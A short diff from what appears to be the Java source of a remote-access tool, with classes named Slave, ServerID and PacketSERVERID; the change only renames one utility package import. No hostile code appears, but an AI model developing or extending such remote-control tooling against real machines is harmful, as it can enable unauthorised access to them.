@@ -4,7 +4,7 @@ import com.redpois0n.ServerID;
 import com.redpois0n.ServerIDEntry;
 import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.Frame;
-import com.redpois0n.util.Util;
+import com.redpois0n.utils.Util;
 
 public class PacketSERVERID extends Packet {
 
